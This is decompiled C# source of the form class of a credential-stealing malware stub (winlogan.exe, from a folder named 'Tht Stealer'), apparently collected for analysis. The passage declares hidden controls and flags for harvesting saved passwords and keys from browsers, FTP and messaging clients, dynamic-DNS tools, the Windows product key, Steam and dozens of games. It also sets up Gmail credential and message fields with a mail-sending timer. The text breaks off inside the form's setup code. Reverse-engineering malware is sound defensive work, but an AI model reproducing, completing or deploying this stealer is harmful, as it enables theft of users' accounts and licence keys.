// Decompiled with JetBrains decompiler
// Type: Form1
// Assembly: winlogan.exe, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 318DE2DF-1405-4E2E-8CC4-399298931BFA
// Assembly location: C:\Users\ZetSving\Desktop\На разбор Стиллеров\Tht Stealer\Tht Stealer\stub.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using My;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

[DesignerGenerated]
public class Form1 : Form
{
  private static List<WeakReference> __ENCList = new List<WeakReference>();
  private IContainer components;
  [AccessedThroughProperty("Timer1")]
  private System.Windows.Forms.Timer _Timer1;
  [AccessedThroughProperty("gonder")]
  private System.Windows.Forms.Timer _gonder;
  [AccessedThroughProperty("chromet")]
  private RichTextBox _chromet;
  [AccessedThroughProperty("genel")]
  private RichTextBox _genel;
  [AccessedThroughProperty("scommandert")]
  private RichTextBox _scommandert;
  [AccessedThroughProperty("SFlashFxpt")]
  private RichTextBox _SFlashFxpt;
  [AccessedThroughProperty("coreftpt")]
  private RichTextBox _coreftpt;
  [AccessedThroughProperty("smartftpt")]
  private RichTextBox _smartftpt;
  [AccessedThroughProperty("noipt")]
  private RichTextBox _noipt;
  [AccessedThroughProperty("dyndnst")]
  private RichTextBox _dyndnst;
  [AccessedThroughProperty("windowskeyt")]
  private RichTextBox _windowskeyt;
  [AccessedThroughProperty("valvet")]
  private RichTextBox _valvet;
  [AccessedThroughProperty("imvut")]
  private RichTextBox _imvut;
  [AccessedThroughProperty("msnt")]
  private RichTextBox _msnt;
  [AccessedThroughProperty("paltalkt")]
  private RichTextBox _paltalkt;
  [AccessedThroughProperty("pidgint")]
  private RichTextBox _pidgint;
  [AccessedThroughProperty("internetexplorert")]
  private RichTextBox _internetexplorert;
  [AccessedThroughProperty("operat")]
  private RichTextBox _operat;
  [AccessedThroughProperty("actofwart")]
  private RichTextBox _actofwart;
  [AccessedThroughProperty("anno1701t")]
  private RichTextBox _anno1701t;
  [AccessedThroughProperty("battlefield1942t")]
  private RichTextBox _battlefield1942t;
  [AccessedThroughProperty("battlefield2t")]
  private RichTextBox _battlefield2t;
  [AccessedThroughProperty("battlefield2142t")]
  private RichTextBox _battlefield2142t;
  [AccessedThroughProperty("battlefieldvietnamt")]
  private RichTextBox _battlefieldvietnamt;
  [AccessedThroughProperty("blackandwhitet")]
  private RichTextBox _blackandwhitet;
  [AccessedThroughProperty("blackandwhitet2t")]
  private RichTextBox _blackandwhitet2t;
  [AccessedThroughProperty("callofdutyt")]
  private RichTextBox _callofdutyt;
  [AccessedThroughProperty("callofduty2t")]
  private RichTextBox _callofduty2t;
  [AccessedThroughProperty("callofduty4t")]
  private RichTextBox _callofduty4t;
  [AccessedThroughProperty("callofduty5t")]
  private RichTextBox _callofduty5t;
  [AccessedThroughProperty("cacgeneralst")]
  private RichTextBox _cacgeneralst;
  [AccessedThroughProperty("cacgeneralzerohourt")]
  private RichTextBox _cacgeneralzerohourt;
  [AccessedThroughProperty("cactst")]
  private RichTextBox _cactst;
  [AccessedThroughProperty("cacrat")]
  private RichTextBox _cacrat;
  [AccessedThroughProperty("cacra2t")]
  private RichTextBox _cacra2t;
  [AccessedThroughProperty("cacra2yt")]
  private RichTextBox _cacra2yt;
  [AccessedThroughProperty("cac3twt")]
  private RichTextBox _cac3twt;
  [AccessedThroughProperty("companyofheroest")]
  private RichTextBox _companyofheroest;
  [AccessedThroughProperty("crysist")]
  private RichTextBox _crysist;
  [AccessedThroughProperty("techlandt")]
  private RichTextBox _techlandt;
  [AccessedThroughProperty("farcryt")]
  private RichTextBox _farcryt;
  [AccessedThroughProperty("farcry2t")]
  private RichTextBox _farcry2t;
  [AccessedThroughProperty("feart")]
  private RichTextBox _feart;
  [AccessedThroughProperty("fifat")]
  private RichTextBox _fifat;
  [AccessedThroughProperty("frontlinest")]
  private RichTextBox _frontlinest;
  [AccessedThroughProperty("hellgatet")]
  private RichTextBox _hellgatet;
  [AccessedThroughProperty("mohat")]
  private RichTextBox _mohat;
  [AccessedThroughProperty("mohaat")]
  private RichTextBox _mohaat;
  [AccessedThroughProperty("mohaabt")]
  private RichTextBox _mohaabt;
  [AccessedThroughProperty("mohaast")]
  private RichTextBox _mohaast;
  [AccessedThroughProperty("nbat")]
  private RichTextBox _nbat;
  [AccessedThroughProperty("nfsut")]
  private RichTextBox _nfsut;
  [AccessedThroughProperty("nfsut2")]
  private RichTextBox _nfsut2;
  [AccessedThroughProperty("nfsct")]
  private RichTextBox _nfsct;
  [AccessedThroughProperty("nfsmwt")]
  private RichTextBox _nfsmwt;
  [AccessedThroughProperty("nfspst")]
  private RichTextBox _nfspst;
  [AccessedThroughProperty("quaket")]
  private RichTextBox _quaket;
  [AccessedThroughProperty("stalkert")]
  private RichTextBox _stalkert;
  [AccessedThroughProperty("swatt")]
  private RichTextBox _swatt;
  [AccessedThroughProperty("unrealt")]
  private RichTextBox _unrealt;
  [AccessedThroughProperty("filezillat")]
  private RichTextBox _filezillat;
  [AccessedThroughProperty("ii")]
  private RichTextBox _ii;
  private const string filesplit = "|batu|";
  private string stub;
  private string gmail;
  private string sifre;
  private string dk;
  private string baslik;
  private string mesaj;
  private string[] opt;
  private int chrome;
  private int coreftp;
  private int dyndns;
  private int filezilla;
  private int flashfxp;
  private int ftpcommander;
  private int imvu;
  private int msn;
  private int noip;
  private int paltalk;
  private int pidgin;
  private int smartftp;
  private int internetexplorer;
  private int firefox;
  private int opera;
  private int windowskey;
  private int valve;
  private int firesec;
  private CIEPasswords PIE;
  private int actofwar;
  private int anno1701;
  private int battlefield1942;
  private int battlefield2;
  private int battlefield2142;
  private int battlefieldvietnam;
  private int blackandwhite;
  private int blackandwhite2;
  private int callofduty;
  private int callofduty2;
  private int callofduty4;
  private int callofduty5;
  private int cacgenerals;
  private int cacgeneralszerohour;
  private int cactiberiansun;
  private int cacredalert;
  private int cacredalert2;
  private int cacredalert2yuri;
  private int cac3tiberiumwars;
  private int companyofheroes;
  private int crysis;
  private int techland;
  private int farcry;
  private int farcry2;
  private int fear;
  private int fifa08;
  private int frontlinesfuelofwar;
  private int hellgatelondon;
  private int mohairborne;
  private int mohalliedassault;
  private int mohaabreakth;
  private int mohaaspearhe;
  private int nba08;
  private int nfsunderground;
  private int nfsunderground2;
  private int nfscarbon;
  private int nfsmostwanted;
  private int nfsprostreet;
  private int quake4;
  private int stalkersoc;
  private int swat4;
  private int unrealt2004;
  private int cchrome;
  private int minecraft;
  private StringBuilder iletilecekmail;

  internal virtual System.Windows.Forms.Timer Timer1
  {
    [DebuggerNonUserCode] get
    {
      return this._Timer1;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.Timer1_Tick);
      if (this._Timer1 != null)
        this._Timer1.Tick -= eventHandler;
      this._Timer1 = value;
      if (this._Timer1 == null)
        return;
      this._Timer1.Tick += eventHandler;
    }
  }

  internal virtual System.Windows.Forms.Timer gonder
  {
    [DebuggerNonUserCode] get
    {
      return this._gonder;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.gonder_Tick);
      if (this._gonder != null)
        this._gonder.Tick -= eventHandler;
      this._gonder = value;
      if (this._gonder == null)
        return;
      this._gonder.Tick += eventHandler;
    }
  }

  internal virtual RichTextBox chromet
  {
    [DebuggerNonUserCode] get
    {
      return this._chromet;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._chromet = value;
    }
  }

  internal virtual RichTextBox genel
  {
    [DebuggerNonUserCode] get
    {
      return this._genel;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._genel = value;
    }
  }

  internal virtual RichTextBox scommandert
  {
    [DebuggerNonUserCode] get
    {
      return this._scommandert;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._scommandert = value;
    }
  }

  internal virtual RichTextBox SFlashFxpt
  {
    [DebuggerNonUserCode] get
    {
      return this._SFlashFxpt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._SFlashFxpt = value;
    }
  }

  internal virtual RichTextBox coreftpt
  {
    [DebuggerNonUserCode] get
    {
      return this._coreftpt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._coreftpt = value;
    }
  }

  internal virtual RichTextBox smartftpt
  {
    [DebuggerNonUserCode] get
    {
      return this._smartftpt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._smartftpt = value;
    }
  }

  internal virtual RichTextBox noipt
  {
    [DebuggerNonUserCode] get
    {
      return this._noipt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._noipt = value;
    }
  }

  internal virtual RichTextBox dyndnst
  {
    [DebuggerNonUserCode] get
    {
      return this._dyndnst;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._dyndnst = value;
    }
  }

  internal virtual RichTextBox windowskeyt
  {
    [DebuggerNonUserCode] get
    {
      return this._windowskeyt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._windowskeyt = value;
    }
  }

  internal virtual RichTextBox valvet
  {
    [DebuggerNonUserCode] get
    {
      return this._valvet;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._valvet = value;
    }
  }

  internal virtual RichTextBox imvut
  {
    [DebuggerNonUserCode] get
    {
      return this._imvut;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._imvut = value;
    }
  }

  internal virtual RichTextBox msnt
  {
    [DebuggerNonUserCode] get
    {
      return this._msnt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._msnt = value;
    }
  }

  internal virtual RichTextBox paltalkt
  {
    [DebuggerNonUserCode] get
    {
      return this._paltalkt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._paltalkt = value;
    }
  }

  internal virtual RichTextBox pidgint
  {
    [DebuggerNonUserCode] get
    {
      return this._pidgint;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._pidgint = value;
    }
  }

  internal virtual RichTextBox internetexplorert
  {
    [DebuggerNonUserCode] get
    {
      return this._internetexplorert;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._internetexplorert = value;
    }
  }

  internal virtual RichTextBox operat
  {
    [DebuggerNonUserCode] get
    {
      return this._operat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._operat = value;
    }
  }

  internal virtual RichTextBox actofwart
  {
    [DebuggerNonUserCode] get
    {
      return this._actofwart;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._actofwart = value;
    }
  }

  internal virtual RichTextBox anno1701t
  {
    [DebuggerNonUserCode] get
    {
      return this._anno1701t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._anno1701t = value;
    }
  }

  internal virtual RichTextBox battlefield1942t
  {
    [DebuggerNonUserCode] get
    {
      return this._battlefield1942t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._battlefield1942t = value;
    }
  }

  internal virtual RichTextBox battlefield2t
  {
    [DebuggerNonUserCode] get
    {
      return this._battlefield2t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._battlefield2t = value;
    }
  }

  internal virtual RichTextBox battlefield2142t
  {
    [DebuggerNonUserCode] get
    {
      return this._battlefield2142t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._battlefield2142t = value;
    }
  }

  internal virtual RichTextBox battlefieldvietnamt
  {
    [DebuggerNonUserCode] get
    {
      return this._battlefieldvietnamt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._battlefieldvietnamt = value;
    }
  }

  internal virtual RichTextBox blackandwhitet
  {
    [DebuggerNonUserCode] get
    {
      return this._blackandwhitet;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._blackandwhitet = value;
    }
  }

  internal virtual RichTextBox blackandwhitet2t
  {
    [DebuggerNonUserCode] get
    {
      return this._blackandwhitet2t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._blackandwhitet2t = value;
    }
  }

  internal virtual RichTextBox callofdutyt
  {
    [DebuggerNonUserCode] get
    {
      return this._callofdutyt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._callofdutyt = value;
    }
  }

  internal virtual RichTextBox callofduty2t
  {
    [DebuggerNonUserCode] get
    {
      return this._callofduty2t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._callofduty2t = value;
    }
  }

  internal virtual RichTextBox callofduty4t
  {
    [DebuggerNonUserCode] get
    {
      return this._callofduty4t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._callofduty4t = value;
    }
  }

  internal virtual RichTextBox callofduty5t
  {
    [DebuggerNonUserCode] get
    {
      return this._callofduty5t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._callofduty5t = value;
    }
  }

  internal virtual RichTextBox cacgeneralst
  {
    [DebuggerNonUserCode] get
    {
      return this._cacgeneralst;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cacgeneralst = value;
    }
  }

  internal virtual RichTextBox cacgeneralzerohourt
  {
    [DebuggerNonUserCode] get
    {
      return this._cacgeneralzerohourt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cacgeneralzerohourt = value;
    }
  }

  internal virtual RichTextBox cactst
  {
    [DebuggerNonUserCode] get
    {
      return this._cactst;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cactst = value;
    }
  }

  internal virtual RichTextBox cacrat
  {
    [DebuggerNonUserCode] get
    {
      return this._cacrat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cacrat = value;
    }
  }

  internal virtual RichTextBox cacra2t
  {
    [DebuggerNonUserCode] get
    {
      return this._cacra2t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cacra2t = value;
    }
  }

  internal virtual RichTextBox cacra2yt
  {
    [DebuggerNonUserCode] get
    {
      return this._cacra2yt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cacra2yt = value;
    }
  }

  internal virtual RichTextBox cac3twt
  {
    [DebuggerNonUserCode] get
    {
      return this._cac3twt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._cac3twt = value;
    }
  }

  internal virtual RichTextBox companyofheroest
  {
    [DebuggerNonUserCode] get
    {
      return this._companyofheroest;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._companyofheroest = value;
    }
  }

  internal virtual RichTextBox crysist
  {
    [DebuggerNonUserCode] get
    {
      return this._crysist;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._crysist = value;
    }
  }

  internal virtual RichTextBox techlandt
  {
    [DebuggerNonUserCode] get
    {
      return this._techlandt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._techlandt = value;
    }
  }

  internal virtual RichTextBox farcryt
  {
    [DebuggerNonUserCode] get
    {
      return this._farcryt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._farcryt = value;
    }
  }

  internal virtual RichTextBox farcry2t
  {
    [DebuggerNonUserCode] get
    {
      return this._farcry2t;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._farcry2t = value;
    }
  }

  internal virtual RichTextBox feart
  {
    [DebuggerNonUserCode] get
    {
      return this._feart;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._feart = value;
    }
  }

  internal virtual RichTextBox fifat
  {
    [DebuggerNonUserCode] get
    {
      return this._fifat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._fifat = value;
    }
  }

  internal virtual RichTextBox frontlinest
  {
    [DebuggerNonUserCode] get
    {
      return this._frontlinest;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._frontlinest = value;
    }
  }

  internal virtual RichTextBox hellgatet
  {
    [DebuggerNonUserCode] get
    {
      return this._hellgatet;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._hellgatet = value;
    }
  }

  internal virtual RichTextBox mohat
  {
    [DebuggerNonUserCode] get
    {
      return this._mohat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._mohat = value;
    }
  }

  internal virtual RichTextBox mohaat
  {
    [DebuggerNonUserCode] get
    {
      return this._mohaat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._mohaat = value;
    }
  }

  internal virtual RichTextBox mohaabt
  {
    [DebuggerNonUserCode] get
    {
      return this._mohaabt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._mohaabt = value;
    }
  }

  internal virtual RichTextBox mohaast
  {
    [DebuggerNonUserCode] get
    {
      return this._mohaast;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._mohaast = value;
    }
  }

  internal virtual RichTextBox nbat
  {
    [DebuggerNonUserCode] get
    {
      return this._nbat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nbat = value;
    }
  }

  internal virtual RichTextBox nfsut
  {
    [DebuggerNonUserCode] get
    {
      return this._nfsut;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nfsut = value;
    }
  }

  internal virtual RichTextBox nfsut2
  {
    [DebuggerNonUserCode] get
    {
      return this._nfsut2;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nfsut2 = value;
    }
  }

  internal virtual RichTextBox nfsct
  {
    [DebuggerNonUserCode] get
    {
      return this._nfsct;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nfsct = value;
    }
  }

  internal virtual RichTextBox nfsmwt
  {
    [DebuggerNonUserCode] get
    {
      return this._nfsmwt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nfsmwt = value;
    }
  }

  internal virtual RichTextBox nfspst
  {
    [DebuggerNonUserCode] get
    {
      return this._nfspst;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._nfspst = value;
    }
  }

  internal virtual RichTextBox quaket
  {
    [DebuggerNonUserCode] get
    {
      return this._quaket;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._quaket = value;
    }
  }

  internal virtual RichTextBox stalkert
  {
    [DebuggerNonUserCode] get
    {
      return this._stalkert;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._stalkert = value;
    }
  }

  internal virtual RichTextBox swatt
  {
    [DebuggerNonUserCode] get
    {
      return this._swatt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._swatt = value;
    }
  }

  internal virtual RichTextBox unrealt
  {
    [DebuggerNonUserCode] get
    {
      return this._unrealt;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._unrealt = value;
    }
  }

  internal virtual RichTextBox filezillat
  {
    [DebuggerNonUserCode] get
    {
      return this._filezillat;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._filezillat = value;
    }
  }

  internal virtual RichTextBox ii
  {
    [DebuggerNonUserCode] get
    {
      return this._ii;
    }
    [DebuggerNonUserCode, MethodImpl(MethodImplOptions.Synchronized)] set
    {
      this._ii = value;
    }
  }

  [DebuggerNonUserCode]
  static Form1()
  {
  }

  public Form1()
  {
    this.Load += new EventHandler(this.Form1_Load);
    Form1.__ENCAddToList((object) this);
    this.PIE = new CIEPasswords();
    this.iletilecekmail = new StringBuilder();
    this.InitializeComponent();
  }

  [DebuggerNonUserCode]
  private static void __ENCAddToList(object value)
  {
    List<WeakReference> list = Form1.__ENCList;
    Monitor.Enter((object) list);
    try
    {
      if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
      {
        int index1 = 0;
        int num1 = 0;
        int num2 = checked (Form1.__ENCList.Count - 1);
        int index2 = num1;
        while (index2 <= num2)
        {
          if (Form1.__ENCList[index2].IsAlive)
          {
            if (index2 != index1)
              Form1.__ENCList[index1] = Form1.__ENCList[index2];
            checked { ++index1; }
          }
          checked { ++index2; }
        }
        Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
        Form1.__ENCList.Capacity = Form1.__ENCList.Count;
      }
      Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
    }
    finally
    {
      Monitor.Exit((object) list);
    }
  }

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if ((!disposing || this.components == null) && !false)
        return;
      this.components.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    this.Timer1 = new System.Windows.Forms.Timer(this.components);
    this.gonder = new System.Windows.Forms.Timer(this.components);
    this.chromet = new RichTextBox();
    this.genel = new RichTextBox();
    this.scommandert = new RichTextBox();
    this.SFlashFxpt = new RichTextBox();
    this.coreftpt = new RichTextBox();
    this.smartftpt = new RichTextBox();
    this.noipt = new RichTextBox();
    this.dyndnst = new RichTextBox();
    this.windowskeyt = new RichTextBox();
    this.valvet = new RichTextBox();
    this.imvut = new RichTextBox();
    this.msnt = new RichTextBox();
    this.paltalkt = new RichTextBox();
    this.pidgint = new RichTextBox();
    this.internetexplorert = new RichTextBox();
    this.operat = new RichTextBox();
    this.actofwart = new RichTextBox();
    this.anno1701t = new RichTextBox();
    this.battlefield1942t = new RichTextBox();
    this.battlefield2t = new RichTextBox();
    this.battlefield2142t = new RichTextBox();
    this.battlefieldvietnamt = new RichTextBox();
    this.blackandwhitet = new RichTextBox();
    this.blackandwhitet2t = new RichTextBox();
    this.callofdutyt = new RichTextBox();
    this.callofduty2t = new RichTextBox();
    this.callofduty4t = new RichTextBox();
    this.callofduty5t = new RichTextBox();
    this.cacgeneralst = new RichTextBox();
    this.cacgeneralzerohourt = new RichTextBox();
    this.cactst = new RichTextBox();
    this.cacrat = new RichTextBox();
    this.cacra2t = new RichTextBox();
    this.cacra2yt = new RichTextBox();
    this.cac3twt = new RichTextBox();
    this.companyofheroest = new RichTextBox();
    this.crysist = new RichTextBox();
    this.techlandt = new RichTextBox();
    this.farcryt = new RichTextBox();
    this.farcry2t = new RichTextBox();
    this.feart = new RichTextBox();
    this.fifat = new RichTextBox();
    this.frontlinest = new RichTextBox();
    this.hellgatet = new RichTextBox();
    this.mohat = new RichTextBox();
    this.mohaat = new RichTextBox();
    this.mohaabt = new RichTextBox();
    this.mohaast = new RichTextBox();
    this.nbat = new RichTextBox();
    this.nfsut = new RichTextBox();
    this.nfsut2 = new RichTextBox();
    this.nfsct = new RichTextBox();
    this.nfsmwt = new RichTextBox();
    this.nfspst = new RichTextBox();
    this.quaket = new RichTextBox();
    this.stalkert = new RichTextBox();
    this.swatt = new RichTextBox();
    this.unrealt = new RichTextBox();
    this.filezillat = new RichTextBox();
    this.ii = new RichTextBox();
    this.SuspendLayout();
    this.Timer1.Enabled = true;
    this.chromet.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox chromet1 = this.chromet;
    Point point1 = new Point(0, 16);
    Point point2 = point1;
    chromet1.Location = point2;
    this.chromet.Name = "chromet";
    RichTextBox chromet2 = this.chromet;
    Size size1 = new Size(10, 10);
    Size size2 = size1;
    chromet2.Size = size2;
    this.chromet.TabIndex = 0;
    this.chromet.Text = "";
    this.chromet.Visible = false;
    this.genel.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox genel1 = this.genel;
    point1 = new Point(0, 0);
    Point point3 = point1;
    genel1.Location = point3;
    this.genel.Name = "genel";
    RichTextBox genel2 = this.genel;
    size1 = new Size(10, 10);
    Size size3 = size1;
    genel2.Size = size3;
    this.genel.TabIndex = 2;
    this.genel.Text = "";
    this.genel.Visible = false;
    this.scommandert.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox scommandert1 = this.scommandert;
    point1 = new Point(0, 64);
    Point point4 = point1;
    scommandert1.Location = point4;
    this.scommandert.Name = "scommandert";
    RichTextBox scommandert2 = this.scommandert;
    size1 = new Size(10, 10);
    Size size4 = size1;
    scommandert2.Size = size4;
    this.scommandert.TabIndex = 4;
    this.scommandert.Text = "";
    this.scommandert.Visible = false;
    this.SFlashFxpt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox sflashFxpt1 = this.SFlashFxpt;
    point1 = new Point(0, 80);
    Point point5 = point1;
    sflashFxpt1.Location = point5;
    this.SFlashFxpt.Name = "SFlashFxpt";
    RichTextBox sflashFxpt2 = this.SFlashFxpt;
    size1 = new Size(10, 10);
    Size size5 = size1;
    sflashFxpt2.Size = size5;
    this.SFlashFxpt.TabIndex = 5;
    this.SFlashFxpt.Text = "";
    this.SFlashFxpt.Visible = false;
    this.coreftpt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox coreftpt1 = this.coreftpt;
    point1 = new Point(0, 96);
    Point point6 = point1;
    coreftpt1.Location = point6;
    this.coreftpt.Name = "coreftpt";
    RichTextBox coreftpt2 = this.coreftpt;
    size1 = new Size(10, 10);
    Size size6 = size1;
    coreftpt2.Size = size6;
    this.coreftpt.TabIndex = 6;
    this.coreftpt.Text = "";
    this.coreftpt.Visible = false;
    this.smartftpt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox smartftpt1 = this.smartftpt;
    point1 = new Point(0, 112);
    Point point7 = point1;
    smartftpt1.Location = point7;
    this.smartftpt.Name = "smartftpt";
    RichTextBox smartftpt2 = this.smartftpt;
    size1 = new Size(10, 10);
    Size size7 = size1;
    smartftpt2.Size = size7;
    this.smartftpt.TabIndex = 7;
    this.smartftpt.Text = "";
    this.smartftpt.Visible = false;
    this.noipt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox noipt1 = this.noipt;
    point1 = new Point(0, 128);
    Point point8 = point1;
    noipt1.Location = point8;
    this.noipt.Name = "noipt";
    RichTextBox noipt2 = this.noipt;
    size1 = new Size(10, 10);
    Size size8 = size1;
    noipt2.Size = size8;
    this.noipt.TabIndex = 8;
    this.noipt.Text = "";
    this.noipt.Visible = false;
    this.dyndnst.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox dyndnst1 = this.dyndnst;
    point1 = new Point(0, 144);
    Point point9 = point1;
    dyndnst1.Location = point9;
    this.dyndnst.Name = "dyndnst";
    RichTextBox dyndnst2 = this.dyndnst;
    size1 = new Size(10, 10);
    Size size9 = size1;
    dyndnst2.Size = size9;
    this.dyndnst.TabIndex = 9;
    this.dyndnst.Text = "";
    this.dyndnst.Visible = false;
    this.windowskeyt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox windowskeyt1 = this.windowskeyt;
    point1 = new Point(0, 160);
    Point point10 = point1;
    windowskeyt1.Location = point10;
    this.windowskeyt.Name = "windowskeyt";
    RichTextBox windowskeyt2 = this.windowskeyt;
    size1 = new Size(10, 10);
    Size size10 = size1;
    windowskeyt2.Size = size10;
    this.windowskeyt.TabIndex = 10;
    this.windowskeyt.Text = "";
    this.windowskeyt.Visible = false;
    this.valvet.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox valvet1 = this.valvet;
    point1 = new Point(0, 176);
    Point point11 = point1;
    valvet1.Location = point11;
    this.valvet.Name = "valvet";
    RichTextBox valvet2 = this.valvet;
    size1 = new Size(10, 10);
    Size size11 = size1;
    valvet2.Size = size11;
    this.valvet.TabIndex = 11;
    this.valvet.Text = "";
    this.valvet.Visible = false;
    this.imvut.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox imvut1 = this.imvut;
    point1 = new Point(0, 192);
    Point point12 = point1;
    imvut1.Location = point12;
    this.imvut.Name = "imvut";
    RichTextBox imvut2 = this.imvut;
    size1 = new Size(10, 10);
    Size size12 = size1;
    imvut2.Size = size12;
    this.imvut.TabIndex = 12;
    this.imvut.Text = "";
    this.imvut.Visible = false;
    this.msnt.ForeColor = Color.FromArgb(32, 32, 32);
    RichTextBox msnt1 = this.msnt;
